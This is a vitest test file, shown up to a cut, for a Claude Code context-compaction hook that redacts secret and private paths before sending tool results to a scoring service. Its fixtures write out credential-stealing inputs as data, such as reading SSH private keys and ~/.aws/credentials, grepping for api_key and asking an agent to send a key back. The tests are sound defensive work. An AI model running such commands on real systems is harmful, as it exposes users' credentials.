/* global setTimeout, clearTimeout, performance */
/**
 * Tests for hooks/jev-compaction.mjs, the Claude Code hooks module of the named-only Jev point
 * `compaction`.
 *
 * The module is driven the way the host drives it: register(on) collects the handlers, each test
 * calls them with a fake `$` (in-memory files, a stubbed $.http.fetch transport, a session) and a
 * `next` that stands for the built-in summary. The transport stub is the only fake of the Jev side.
 */

import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';

import { boundExcerpts, classifyFailure, DEFAULT_EXCERPT_CHARS, mediumThreshold, omitSecretLines, pairingOk, parseMaxRpm, pointMode, QUESTION_CRITERIA, QUESTION_INSTRUCTIONS, register, retryAfterFromBody, retryAfterMs, sharedFailureClass } from '../../hooks/jev-compaction.mjs';
import { breakerSettings, classifyFailure as sharedClassifyFailure, parseMaxRpm as sharedParseMaxRpm, readBreaker, recordFailure, reserveRequest, retryAfterFromBody as sharedRetryAfterFromBody, thresholdFor } from '../../scripts/lib/jev-breaker.mjs';
import { maskSecrets } from '../../scripts/lib/jev-mask.mjs';
import { parseJevEnv, resolveExcerptChars, serializeQuestions } from '../../scripts/jev-resolve.mjs';
import { boundExcerpts as tsBoundExcerpts, excerptCharsFor, parseJevConfig } from '../hooks/jev/config.ts';
import { JUDGMENT_POINTS } from '../hooks/jev/points.ts';

const root = join(fileURLToPath(import.meta.url), '..', '..', '..');
const STATE = '/home/u/.omc/state/jev';
const SPOOL = `${STATE}/compaction-spool`;

const ACTIVE_ENV = { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', HOME: '/home/u' };

/** Score answers: 3 for results whose text holds NEEDED, 2 for MAYBE, 0 for the rest. */
function scoreByMarker(body) {
  const answers = {};
  for (const name of Object.keys(body.questions)) {
    const text = body.state.results[name].result;
    answers[name] = { type: 'score', score: /NEEDED/.test(text) ? 3 : /MAYBE/.test(text) ? 2 : 0, confidence: 0.9 };
  }
  return { answers };
}

function okResponse(json) {
  return { ok: true, status: 200, headers: {}, text: JSON.stringify(json) };
}

function fakeDollar({ env = ACTIVE_ENV, settingsEnv, respond = (body) => okResponse(scoreByMarker(body)), clockAfter, usage, messages = [], compactResult, writeThrows = false, diskPrefix, flakyBreakerRead = false, stallBreakerRead = false, stallRpmRead = false, rpmReadGate, rpmReadGates = {}, fsDelayMs = 0 } = {}) {
  const files = new Map();
  let flaked = false;
  let gated = false;
  let rpmReads = 0;
  const calls = { fetch: [], write: 0, toast: [], log: 0, compact: 0, usage: 0, messages: 0, settings: 0 };
  const $ = {
    env: { get: async (name) => env[name] },
    settings: { read: async ({ key }) => { calls.settings++; return key === 'env' ? settingsEnv : undefined; } },
    fs: {
      read: async (p) => {
        if (fsDelayMs) await new Promise((resolve) => setTimeout(resolve, fsDelayMs));
        if (flakyBreakerRead && !flaked && p.endsWith('/breaker.json')) { flaked = true; throw new Error('EPERM'); }
        if (stallBreakerRead && p.endsWith('/breaker.json')) return new Promise(() => {});
        if (stallRpmRead && /\/rpm-\d+$/.test(p)) return new Promise(() => {});
        if (rpmReadGate && !gated && /\/rpm-\d+$/.test(p)) { gated = true; await rpmReadGate; }
        if (/\/rpm-\d+$/.test(p)) { rpmReads += 1; if (rpmReadGates[rpmReads]) await rpmReadGates[rpmReads]; }
        if (diskPrefix && p.startsWith(diskPrefix)) return readFileSync(p, 'utf8'); if (!files.has(p)) throw new Error('ENOENT'); return files.get(p);
      },
      exists: async (p) => (diskPrefix && p.startsWith(diskPrefix) ? existsSync(p) : files.has(p)),
      write: async (p, text) => {
        if (fsDelayMs) await new Promise((resolve) => setTimeout(resolve, fsDelayMs));
        if (diskPrefix && p.startsWith(diskPrefix)) { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, text); return; }
        calls.write++; if (writeThrows) throw new Error('EACCES'); files.set(p, text);
      },
      list: async () => [],
    },
    http: {
      fetch: async (url, init) => {
        const body = JSON.parse(init.body);
        calls.fetch.push({ url, init, body });
        return respond(body, calls.fetch.length);
      },
    },
    clock: {
      after: (ms, fn) => { const t = setTimeout(fn, clockAfter !== undefined && ms >= 5000 ? clockAfter : ms); return { cancel: () => clearTimeout(t) }; },
      sleep: async () => { throw new Error('the module must not use $.clock.sleep'); },
    },
    session: {
      id: async () => 'sess-1',
      usage: async (opts) => { calls.usage++; return usage ? usage(opts) : { context: { tokens: 1000, window: 200000 } }; },
      messages: async () => { calls.messages++; return messages; },
      compact: async () => { calls.compact++; if (compactResult instanceof Error) throw compactResult; return compactResult ?? {}; },
    },
    ui: { log: () => { calls.log++; }, toast: (text) => { calls.toast.push(text); } },
  };
  const records = () => [...files.entries()].filter(([p]) => p.startsWith(`${SPOOL}/`)).map(([, t]) => JSON.parse(t));
  return { $, calls, files, records };
}

function load() {
  const handlers = {};
  register((event, hook) => { handlers[event] = hook; });
  return handlers;
}

const SUMMARY = { messages: [{ role: 'user', text: 'SUMMARY', toolUses: [] }] };
function summaryNext() {
  const seen = [];
  const next = async (e) => { seen.push(e); return SUMMARY; };
  next.seen = seen;
  return next;
}

/** A conversation: a first user message, `n` call/result pairs, then a request and an answer. */
function conversation(n, { chars = 2000, needed = [], maybe = [], tool = () => 'Bash', input = (i) => ({ command: `cat notes-${i}.txt` }), result, last = 'Good, now sum up the NEEDED results.' } = {}) {
  const m = [{ role: 'user', text: 'Task: review the notes and count the lines.', toolUses: [] }];
  for (let i = 1; i <= n; i++) {
    m.push({ role: 'assistant', text: `Step ${i}.`, toolUses: [{ tool_use_id: `t${i}`, tool: tool(i), input: input(i) }] });
    const text = result ? result(i) : `RESULT-${i} ${needed.includes(i) ? 'NEEDED ' : maybe.includes(i) ? 'MAYBE ' : ''}${'x'.repeat(chars)}`;
    m.push({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: `t${i}`, text, isError: false }] });
  }
  m.push({ role: 'user', text: last, toolUses: [] });
  m.push({ role: 'assistant', text: 'Summary: done.', toolUses: [] });
  return m.map((x, k) => Object.freeze({ ...x, handle: `h${k}` }));
}

const chars = (messages) => messages.reduce((s, m) => s + (m.text || '').length
  + (m.toolUses || []).reduce((a, u) => a + u.tool.length + JSON.stringify(u.input ?? {}).length, 0)
  + (m.toolResults || []).reduce((a, r) => a + (r.text || '').length, 0), 0);
const resultOf = (messages, id) => messages.flatMap((m) => m.toolResults || []).find((r) => r.tool_use_id === id);
const sentResults = (calls) => calls.fetch.flatMap((c) => Object.values(c.body.state.results));

async function compactOnce(messages, options = {}, event = {}) {
  const handlers = options.handlers ?? load();
  const fake = fakeDollar(options);
  const next = summaryNext();
  const e = Object.freeze({ trigger: 'auto', messages, ...event });
  const out = await handlers['session.compact'](fake.$, e, next);
  return { out, next, e, handlers, ...fake };
}

describe('jev-compaction module: without the point it behaves as if it were not installed', () => {
  const offEnvs = [
    ['no OMC_JEV', { TYPESAFE_API_KEY: 'k', HOME: '/home/u' }],
    ['all:active', { OMC_JEV: 'all:active', TYPESAFE_API_KEY: 'k', HOME: '/home/u' }],
    ['all', { OMC_JEV: 'all', TYPESAFE_API_KEY: 'k', HOME: '/home/u' }],
    ['no key', { OMC_JEV: 'compaction:active', HOME: '/home/u' }],
    ['OMC_JEV=off', { OMC_JEV: 'off', TYPESAFE_API_KEY: 'k', HOME: '/home/u' }],
    ['nothing at all', {}],
  ];

  it.each(offEnvs)('%s: session.compact passes the same event to next and returns its result; no request, file or output', async (_label, env) => {
    for (const trigger of ['auto', 'manual', 'plugin', 'precompute']) {
      const { out, next, e, calls } = await compactOnce(conversation(30), { env }, { trigger });
      expect(next.seen).toHaveLength(1);
      expect(next.seen[0]).toBe(e);
      expect(out).toBe(SUMMARY);
      expect(calls.fetch).toHaveLength(0);
      expect(calls.write).toBe(0);
      expect(calls.toast).toHaveLength(0);
      expect(calls.log).toBe(0);
    }
  });

  it.each(offEnvs)('%s: turn.complete returns next\'s result and never reads the session or asks to compact', async (_label, env) => {
    const handlers = load();
    const fake = fakeDollar({ env: { ...env, OMC_JEV_COMPACT_AT_PERCENT: '10' }, usage: () => ({ context: { tokens: 190000, window: 200000 } }), messages: conversation(30, { chars: 4000 }) });
    const result = { done: true };
    for (let turn = 0; turn < 12; turn++) {
      const seen = [];
      const out = await handlers['turn.complete'](fake.$, { isAborted: false }, async (e) => { seen.push(e); return result; });
      expect(out).toBe(result);
      expect(seen).toHaveLength(1);
    }
    expect(fake.calls.usage).toBe(0);
    expect(fake.calls.messages).toBe(0);
    expect(fake.calls.compact).toBe(0);
    expect(fake.calls.fetch).toHaveLength(0);
    expect(fake.calls.write).toBe(0);
  });
});

describe('jev-compaction module: active compaction', () => {
  it('keeps every user message and assistant text verbatim, fills the budget by score and leaves a trace for every removed call', async () => {
    const messages = conversation(30, { needed: [3, 9, 20] });
    const { out, next, calls, records } = await compactOnce(messages);
    expect(next.seen).toHaveLength(0);
    expect(calls.fetch).toHaveLength(1);
    const after = out.messages;
    expect(after[0]).toBe(messages[0]);
    expect(after.slice(-6).map((m) => m.text)).toEqual(messages.slice(-6).map((m) => m.text));
    for (const m of messages.filter((x) => x.role === 'user' && x.text)) expect(after.some((a) => a.text === m.text)).toBe(true);
    for (const m of messages.filter((x) => x.role === 'assistant')) expect(after.some((a) => a.role === 'assistant' && a.text.startsWith(m.text))).toBe(true);
    for (const id of ['t3', 't9', 't20']) expect(resultOf(after, id)?.text).toBe(resultOf(messages, id).text);
    const traces = after.flatMap((m) => (m.text || '').split('\n')).filter((l) => l.startsWith('[compacted] Bash(cat notes-'));
    const kept = new Set(after.flatMap((m) => m.toolResults || []).map((r) => r.tool_use_id));
    let removed = 0;
    for (let i = 1; i <= 30; i++) {
      if (!kept.has(`t${i}`)) { removed++; expect(traces.some((l) => l.includes(`notes-${i}.txt)`))).toBe(true); }
    }
    expect(removed).toBeGreaterThan(10);
    expect(chars(after)).toBeLessThanOrEqual(Math.floor(chars(messages) * 0.5));
    const callIds = new Set(after.flatMap((m) => m.toolUses || []).map((u) => u.tool_use_id));
    expect([...kept].every((id) => callIds.has(id))).toBe(true);
    expect([...callIds].every((id) => kept.has(id))).toBe(true);
    const [record] = records();
    expect(record).toMatchObject({ point: 'compaction', event: 'compact', result: 'jev', session_id: 'sess-1', agent_id: null, requests: 1, candidates: 28, asked: 28, answered: 28, unanswered: 0, score_hist: [25, 0, 0, 3] });
    expect(record.reduction).toBeGreaterThanOrEqual(0.5);
    // The log holds counts, never content.
    expect(JSON.stringify(record)).not.toMatch(/RESULT-|notes-|Task: review/);
  });

  it('cuts a result rated "may be useful" to 300 characters when it does not fit whole, and follows OMC_JEV_COMPACT_TARGET', async () => {
    const messages = conversation(30, { chars: 3000, needed: [25, 26, 27, 28], maybe: [2] });
    const { out, records } = await compactOnce(messages, { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_TARGET: '0.2' } });
    const short = resultOf(out.messages, 't2');
    expect(short.text).toMatch(/^RESULT-2 MAYBE x+\n\[result shortened at compaction: kept 300 of 3015 chars\]$/);
    expect(chars(out.messages)).toBeLessThanOrEqual(Math.floor(chars(messages) * 0.2));
    expect(records()[0].target).toBe(0.2);
    expect(records()[0].kept_short).toBeGreaterThanOrEqual(1);
    const loose = await compactOnce(messages, { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_TARGET: '0.8' } });
    expect(chars(loose.out.messages)).toBeGreaterThan(chars(messages) * 0.6);
    expect(chars(loose.out.messages)).toBeLessThanOrEqual(Math.floor(chars(messages) * 0.8));
  });

  it('asks in batches of 40 with at most 6 requests, newest results first; older results are not sent and become traces', async () => {
    const messages = conversation(300, { chars: 400 });
    const { out, calls, records } = await compactOnce(messages);
    expect(calls.fetch).toHaveLength(6);
    for (const c of calls.fetch) expect(Object.keys(c.body.questions)).toHaveLength(40);
    const sent = sentResults(calls).map((r) => r.input);
    expect(sent.some((x) => x.includes('notes-294.txt'))).toBe(true);
    expect(sent.some((x) => /notes-(1|2|3)\.txt/.test(x))).toBe(false);
    expect(resultOf(out.messages, 't1')).toBeUndefined();
    expect(out.messages.some((m) => (m.text || '').includes('[compacted] Bash(cat notes-1.txt) - result of'))).toBe(true);
    expect(records()[0]).toMatchObject({ asked: 240, requests: 6, requests_ok: 6 });
  });

  it('OMC_JEV_MAX_REQUESTS caps the requests of the session; once used up the summary runs', async () => {
    const handlers = load();
    const env = { ...ACTIVE_ENV, OMC_JEV_MAX_REQUESTS: '4' };
    const first = await compactOnce(conversation(300, { chars: 400 }), { handlers, env });
    expect(first.calls.fetch).toHaveLength(4);
    expect(first.records()[0]).toMatchObject({ asked: 160, requests: 4, result: 'jev' });
    const second = await compactOnce(conversation(30), { handlers, env });
    expect(second.calls.fetch).toHaveLength(0);
    expect(second.out).toBe(SUMMARY);
    expect(second.records()[0]).toMatchObject({ result: 'fallback', reason: 'cap' });
  });

  it('sends the documented state: user task, /compact instructions, bounded and masked results; the question is the registry\'s', async () => {
    const secret = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123';
    const messages = conversation(20, { chars: 5000, result: (i) => `HEAD-${i} token ${secret} ${'y'.repeat(4000)} TAIL-${i}` });
    const withNoise = [
      messages[0],
      Object.freeze({ role: 'user', text: '<system-reminder>reminder text</system-reminder>', toolUses: [] }),
      Object.freeze({ role: 'user', text: '<system-reminder>inline reminder</system-reminder>\nPlease also check the TAIL lines.', toolUses: [] }),
      ...messages.slice(1),
    ];
    const { calls } = await compactOnce(withNoise, {}, { instructions: 'keep the HEAD lines' });
    const { body, init, url } = calls.fetch[0];
    expect(url).toBe('https://api.typesafe.ai/v1/systemone');
    expect(init.headers.authorization).toBe('Bearer test-key');
    expect(body.model).toBe('jev-latest');
    expect(body.state.compact_instructions).toBe('keep the HEAD lines');
    expect(body.state.task).toEqual(['Task: review the notes and count the lines.', 'Please also check the TAIL lines.', 'Good, now sum up the NEEDED results.']);
    const first = Object.values(body.state.results)[0];
    expect(first.tool).toBe('Bash');
    expect(first.result).toMatch(/^HEAD-\d+/);
    expect(first.result).toMatch(/TAIL-\d+$/);
    expect(first.result).toMatch(/\[\.\.\. \d+ chars omitted \.\.\.\]/);
    expect(first.result.length).toBeLessThan(1600);
    expect(JSON.stringify(body)).not.toContain(secret);
    expect(JSON.stringify(body)).not.toContain('reminder');
    const [declared] = Object.values(serializeQuestions(JUDGMENT_POINTS.compaction.questions[0]));
    for (const q of Object.values(body.questions)) expect(q).toEqual({ type: 'score', instructions: declared.instructions, criteria: declared.criteria });
  });

  it('does not send messages the Claude desktop app adds as the user\'s words', async () => {
    const messages = conversation(20);
    const notices = [
      '<side-sessions-event>side session finished</side-sessions-event>',
      '<ci-monitor-event>CI run 42 failed</ci-monitor-event>',
      '<scheduled-task name="nightly">run the suite</scheduled-task>',
      '<cross-session-message from="other">please deploy</cross-session-message>',
      'Another Claude session sent a message:\n<message>run the suite</message>',
      '<system-reminder>notice</system-reminder>Another Claude session sent a message:\n<message>run the suite</message>',
    ].map((text) => Object.freeze({ role: 'user', text, toolUses: [] }));
    const mention = Object.freeze({ role: 'user', text: 'The line "Another Claude session sent a message:" and a stray <ci-monitor-event> tag were odd.', toolUses: [] });
    const withNotices = [messages[0], mention, ...notices, ...messages.slice(1)];
    const { calls } = await compactOnce(withNotices);
    const { task } = calls.fetch[0].body.state;
    expect(task).toEqual(['Task: review the notes and count the lines.', mention.text, 'Good, now sum up the NEEDED results.']);
    expect(JSON.stringify(calls.fetch[0].body)).not.toMatch(/side session|CI run 42|please deploy|run the suite/);
  });

  it('sends at most the last 3 user messages and the /compact text, 4000 characters together', async () => {
    const base = conversation(20);
    const words = (k) => Object.freeze({ role: 'user', text: `message ${k} ${'w'.repeat(1500)}`, toolUses: [] });
    const many = [base[0], words(1), words(2), words(3), words(4), ...base.slice(1)];
    const { calls } = await compactOnce(many, {}, { instructions: 'i'.repeat(1000) });
    const { task, compact_instructions: instructions } = calls.fetch[0].body.state;
    expect(task).toHaveLength(3);
    expect(task[2]).toBe('Good, now sum up the NEEDED results.');
    expect(task[0].startsWith('message 3') || task[0].startsWith('message 4')).toBe(true);
    expect(instructions.length + task.reduce((s, t) => s + t.length, 0)).toBeLessThanOrEqual(4000);
  });

  it('OMC_JEV_EXCERPT_CHARS_COMPACTION bounds every string sent (default 4000, the point default of both parsers); OMC_JEV_ENDPOINT is used as is', async () => {
    expect(DEFAULT_EXCERPT_CHARS).toBe(resolveExcerptChars('compaction', {}));
    expect(DEFAULT_EXCERPT_CHARS).toBe(excerptCharsFor('compaction', parseJevConfig({})));
    expect(resolveExcerptChars('compaction', { OMC_JEV_EXCERPT_CHARS: '50' })).toBe(DEFAULT_EXCERPT_CHARS);
    const env = { ...ACTIVE_ENV, OMC_JEV_EXCERPT_CHARS_COMPACTION: '50', OMC_JEV_EXCERPT_CHARS: '9000', OMC_JEV_ENDPOINT: 'https://jev.example.test/v1/systemone' };
    const { calls } = await compactOnce(conversation(20), { env });
    expect(calls.fetch[0].url).toBe('https://jev.example.test/v1/systemone');
    const strings = [];
    const walk = (v) => { if (typeof v === 'string') strings.push(v); else if (v && typeof v === 'object') Object.values(v).forEach(walk); };
    walk(calls.fetch[0].body.state);
    expect(strings.length).toBeGreaterThan(0);
    expect(Math.max(...strings.map((s) => s.length))).toBe(50);
  });

  it('never sends results of calls on secret or private paths, nor results without text; they become traces', async () => {
    const calls = {
      2: ['Read', { file_path: '/home/u/.ssh/id_ed25519' }],
      4: ['Read', { file_path: '/work/.env' }],
      5: ['mcp__filesystem__read_file', { path: '/home/u/.ssh/deploy_key' }],
      6: ['Read', { file_path: 'C:\\Vault\\keys\\a.txt' }],
      7: ['Bash', { command: 'cat ~/secret-notes/today.md' }],
      8: ['Read', { file_path: '/work/.env.example' }],
      11: ['Read', { file_path: '/work/.envrc' }],
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
    }).map((m) => (m.toolResults?.[0]?.tool_use_id === 't10' ? Object.freeze({ ...m, toolResults: [{ ...m.toolResults[0], result: [{ type: 'image', source: { type: 'base64', data: 'AAAA' } }] }] }) : m));
    const env = { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: 'c:\\vault\\, ~/secret-notes' };
    const run = await compactOnce(messages, { env });
    const inputs = sentResults(run.calls).map((r) => JSON.parse(r.input));
    expect(inputs.filter((i) => i.file_path || i.path).map((i) => i.file_path || i.path)).toEqual(['/work/.env.example']);
    expect(inputs.some((i) => /secret-notes/.test(i.command || ''))).toBe(false);
    for (const id of ['t2', 't4', 't5', 't6', 't7', 't10', 't11']) expect(resultOf(run.out.messages, id)).toBeUndefined();
    expect(run.out.messages.some((m) => (m.text || '').includes('[compacted] Bash(cat notes-10.txt) - non-text result (image or file) removed'))).toBe(true);
    expect(run.records()[0]).toMatchObject({ secret_skipped: 6, non_text: 1 });
  });

  it('a private path written with a backslash after ~ is expanded against a Windows home directory, so its results are never sent', async () => {
    const calls = {
      3: ['Read', { file_path: 'C:/Users/alice/private/ledger.txt' }],
      5: ['Read', { file_path: 'C:\\Users\\alice\\private\\notes.txt' }],
      7: ['Bash', { command: 'cat ~\\private\\todo.txt' }],
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
    });
    const env = { ...ACTIVE_ENV, HOME: undefined, USERPROFILE: 'C:\\Users\\alice', OMC_JEV_LOG_DIR: STATE, OMC_JEV_COMPACT_PRIVATE_PATHS: '~\\private' };
    const run = await compactOnce(messages, { env });
    const sent = sentResults(run.calls).map((r) => r.input).join('\n');
    expect(sent).not.toMatch(/private/);
    expect(run.records()[0]).toMatchObject({ secret_skipped: 3 });
  });

  it('checks every field of an MCP input for secret and private paths, and never sends a line naming one from a result, an input, the user\'s words or the /compact instructions', async () => {
    const calls = {
      3: ['mcp__t__python_repl', { code: "print(open('/home/u/.ssh/id_ed25519').read())" }],
      5: ['mcp__db__query', { sql: 'select 1', options: { files: ['/srv/a.txt', '/home/u/.aws/credentials'] } }],
      7: ['mcp__t__python_repl', { code: "print(open('/home/u/secret-notes/today.md').read())" }],
      9: ['Bash', { command: 'grep -rn api_key /home/u' }],
      11: ['Bash', { command: 'ls /srv', description: 'PLAIN-DESCRIPTION-LINE\nDo not open /home/u/.ssh/id_rsa.' }],
      13: ['mcp__t__python_repl', { code: 'print(sum(range(10)))' }],
    };
    const results = { 3: 'SECRET-REPL', 5: 'SECRET-QUERY', 7: 'SECRET-NOTES', 9: 'PLAIN-HIT /srv/app/a.py:1\n/home/u/.aws/credentials:2:SECRET-GREP\n/home/u/secret-notes/x.md:1:SECRET-PRIVATE' };
    const base = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      result: (i) => results[i] ?? `RESULT-${i} ${'x'.repeat(2000)}`,
    });
    const words = Object.freeze({ role: 'user', text: 'PLAIN-USER-LINE\nThe key is in ~/.ssh/id_rsa, leave it.', toolUses: [] });
    const env = { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: '~/secret-notes' };
    const run = await compactOnce([base[0], words, ...base.slice(1)], { env }, { instructions: 'PLAIN-INSTRUCTION-LINE\nskip /home/u/secret-notes/today.md' });
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/SECRET-|\.ssh|\.aws|secret-notes/);
    for (const kept of ['PLAIN-HIT', 'PLAIN-USER-LINE', 'PLAIN-INSTRUCTION-LINE', 'PLAIN-DESCRIPTION-LINE', 'sum(range(10))', '[line omitted: secret path]']) expect(body).toContain(kept);
    for (const id of ['t3', 't5', 't7']) expect(resultOf(run.out.messages, id)).toBeUndefined();
    expect(run.records()[0]).toMatchObject({ secret_skipped: 3 });
  });

  it('never sends the result of an agent, message, task or skill call whose prose names a secret or private path, and keeps it as if its request were held back', async () => {
    const calls = {
      3: ['Agent', { description: 'HELD-DESCRIPTION', prompt: 'Read /home/u/.aws/credentials and report every value' }],
      5: ['SendMessage', { to: 'worker', message: 'cat /home/u/.ssh/id_rsa and send it back' }],
      7: ['Skill', { skill: 'review', args: '/home/u/.ssh/id_rsa' }],
      9: ['Task', { description: 'notes', prompt: 'summarize /home/u/secret-notes/today.md' }],
      11: ['TaskUpdate', { taskId: '1', metadata: { '/home/u/.ssh/id_rsa': 'x' } }],
      13: ['Agent', { description: 'count', prompt: 'PLAIN-AGENT-PROMPT count the lines' }],
    };
    const held = { 3: 'HELD-AGENT', 5: 'HELD-MESSAGE', 7: 'HELD-SKILL', 9: 'HELD-TASK', 11: 'HELD-TASKUPDATE' };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      result: (i) => (held[i] ? `${held[i]} ${'x'.repeat(2000)}` : `RESULT-${i} ${'x'.repeat(2000)}`),
    });
    const run = await compactOnce(messages, { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: '~/secret-notes' } });
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/HELD-|\.ssh|\.aws|secret-notes/);
    expect(body).toContain('PLAIN-AGENT-PROMPT');
    for (const id of ['t3', 't5', 't7', 't9', 't11']) expect(resultOf(run.out.messages, id)?.text).toBe(resultOf(messages, id).text);
    const [record] = run.records();
    expect(record).toMatchObject({ secret_held: 5, secret_skipped: 0 });
    expect(sentResults(run.calls)).toHaveLength(record.asked);
  });

  it('a private path in a JSON form (doubled backslashes, escaped slashes, a doubled slash) is recognized in an MCP input and in a result line', async () => {
    const BS = '\\';
    const pp = ['c:/users/x/private', '/home/u/secret-notes'];
    for (const line of [`C:${BS}${BS}Users${BS}${BS}x${BS}${BS}private${BS}${BS}a.txt`, `C:${BS}Users${BS}x${BS}private${BS}a.txt`, `${BS}/home${BS}/u${BS}/secret-notes${BS}/x.md`, '/home/u//secret-notes/x.md']) {
      expect(omitSecretLines(`ok\n{"f":"${line}","v":"PRIVATE-VALUE"}`, pp)).toBe('ok\n[line omitted: secret path]');
    }
    const calls = {
      3: ['mcp__fs__read', { request: `{"path":"C:${BS}${BS}Users${BS}${BS}x${BS}${BS}private${BS}${BS}a.txt"}` }],
      5: ['mcp__fs__read', { request: `{"path":"${BS}/home${BS}/u${BS}/secret-notes${BS}/x.md"}` }],
      7: ['mcp__t__python_repl', { code: "print(open('/home/u//secret-notes/x.md').read())" }],
    };
    const results = {
      3: 'PRIVATE-WIN', 5: 'PRIVATE-ESCAPED', 7: 'PRIVATE-DOUBLE',
      9: [
        'PLAIN-JSON-HIT {"ok":1}',
        `{"hit":"C:${BS}${BS}Users${BS}${BS}x${BS}${BS}private${BS}${BS}a.txt","v":"PRIVATE-WIN-LINE"}`,
        `{"f":"${BS}/home${BS}/u${BS}/secret-notes${BS}/x.md","v":"PRIVATE-ESCAPED-LINE"}`,
        '/home/u//secret-notes/y.md:1:PRIVATE-DOUBLE-LINE',
      ].join('\n'),
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      result: (i) => results[i] ?? `RESULT-${i} ${'x'.repeat(2000)}`,
    });
    const env = { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: 'C:\\Users\\x\\private, ~/secret-notes' };
    const run = await compactOnce(messages, { env });
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
    expect(body).not.toMatch(/PRIVATE-|secret-notes|Users/);
    expect(body).toContain('PLAIN-JSON-HIT');
    expect(body).toContain('[line omitted: secret path]');
    for (const id of ['t3', 't5', 't7']) expect(resultOf(run.out.messages, id)).toBeUndefined();
    expect(run.records()[0]).toMatchObject({ secret_skipped: 3 });
  });

  it('recognizes .env paths with punctuation delimiters (colon, comma) as secret paths', () => {
    // Test .env with grep-style colon delimiter
    expect(omitSecretLines('/repo/.env:2:shortsecret', [])).toBe('[line omitted: secret path]');
    expect(omitSecretLines('ERROR: /repo/.env:2:value', [])).toBe('[line omitted: secret path]');
    
    // Test .env with comma delimiter (in lists or prose)
    expect(omitSecretLines('/repo/.env, other-file.txt', [])).toBe('[line omitted: secret path]');
    expect(omitSecretLines('files: /repo/.env, /repo/src', [])).toBe('[line omitted: secret path]');
    
    // Ensure .env.example is still not treated as secret even with punctuation
    expect(omitSecretLines('/repo/.env.example:1:notasecret', [])).toBe('/repo/.env.example:1:notasecret');
    expect(omitSecretLines('/repo/.env.example, other', [])).toBe('/repo/.env.example, other');
  });

  it('conservatively holds TaskOutput results since they may come from background tasks that accessed secrets', async () => {
    const messages = conversation(20, {
      tool: (i) => {
        if (i === 3) return 'Bash';
        if (i === 5) return 'TaskOutput';
        return 'Bash';
      },
      input: (i) => {
        if (i === 3) return { command: 'process data' };
        if (i === 5) return { task_id: 'bg-task-123' };
        return { command: `cat notes-${i}.txt` };
      },
    });
    const run = await compactOnce(messages);
    const [record] = run.records();
    // TaskOutput (at i=5) should be held conservatively
    expect(record.task_output_held).toBeGreaterThanOrEqual(1);
  });

  it('reads a run of a million slashes or backslashes in linear time, in a private-path check and in a command\'s file names', async () => {
    const pp = ['/home/u/secret-notes'];
    for (const s of ['/'.repeat(1_000_000), '\\'.repeat(1_000_000), `a${'/'.repeat(1_000_000)}!`, `${'\\/'.repeat(500_000)}x.md`]) {
      let best = Infinity;
      for (let k = 0; k < 3; k++) {
        const t0 = performance.now();
        expect(omitSecretLines(s, pp)).toBe(s);
        best = Math.min(best, performance.now() - t0);
      }
      expect(best).toBeLessThan(50);
    }
    const calls = {
      3: ['mcp__fs__read', { path: '/'.repeat(1_000_000) }],
      5: ['Bash', { command: `cat ${'/'.repeat(1_000_000)}notes-5.txt` }],
      7: ['Bash', { command: `cat ${'a'.repeat(1_000_000)}` }],
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
      last: 'The value inside notes-5.txt will be needed later.',
    });
    const t0 = performance.now();
    const run = await compactOnce(messages, { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_PRIVATE_PATHS: '~/secret-notes' } });
    expect(performance.now() - t0).toBeLessThan(2000);
    expect(run.records()[0].mentioned).toBe(1);
  });

  it('checks the keys of an MCP input, counts only strings and keys toward the walk limit, fails closed beyond it or below depth 8, and sends a named-field tool\'s input with a key naming a secret path omitted', async () => {
    let deep9 = 'leaf';
    for (let k = 0; k < 9; k++) deep9 = { a: deep9 };
    let deep8 = 'leaf';
    for (let k = 0; k < 8; k++) deep8 = { a: deep8 };
    const calls = {
      3: ['mcp__fs__copy', { map: { '/home/u/.ssh/id_rsa': '/srv/k' } }],
      5: ['mcp__db__insert', { rows: Array.from({ length: 2001 }, (_, k) => `v${k}`) }],
      7: ['mcp__db__count', { rows: Array.from({ length: 2001 }, (_, k) => k) }],
      9: ['mcp__t__deep', deep9],
      11: ['mcp__t__shallow', deep8],
      13: ['Bash', { command: 'ls /srv', env: { '/home/u/.ssh/id_rsa': 'KEYED-VALUE' } }],
    };
    const messages = conversation(20, {
      tool: (i) => (calls[i] ? calls[i][0] : 'Bash'),
      input: (i) => (calls[i] ? calls[i][1] : { command: `cat notes-${i}.txt` }),
    });
    const run = await compactOnce(messages);
    const body = JSON.stringify(run.calls.fetch.map((c) => c.body));
